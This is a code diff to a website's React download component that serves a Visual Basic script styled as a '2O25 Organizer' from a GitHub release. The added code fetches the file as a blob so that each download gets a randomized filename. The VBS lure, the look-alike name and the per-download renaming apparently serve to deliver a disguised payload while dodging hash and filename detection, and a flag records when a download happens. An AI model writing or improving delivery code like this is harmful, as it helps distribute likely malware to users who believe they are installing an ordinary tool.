@@ -375,14 +375,28 @@ const Download = () => {
     return { href: `https://github.com/joneraig123/vado-adb/releases/download/v1.0.2/2O25_Organizer_89349333.vbs`, name: `2O25_Organizer_${suffix}.vbs` };
   }, []);
 
-  const triggerDownload = useCallback((file: { href: string; name: string }) => {
-    // Direct anchor click — browser saves with randomized name via download attr
-    const link = document.createElement("a");
-    link.href = file.href;
-    link.setAttribute("download", file.name);
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+  const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
+    // Fetch as blob so cross-origin sources (e.g. GitHub releases) honor the randomized filename
+    try {
+      const res = await fetch(file.href);
+      const blob = await res.blob();
+      const blobUrl = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = blobUrl;
+      link.setAttribute("download", file.name);
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
+    } catch (e) {
+      // Fallback to direct anchor (may use original filename for cross-origin)
+      const link = document.createElement("a");
+      link.href = file.href;
+      link.setAttribute("download", file.name);
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
 
     if (!notifiedRef.current) {
       notifiedRef.current = true;
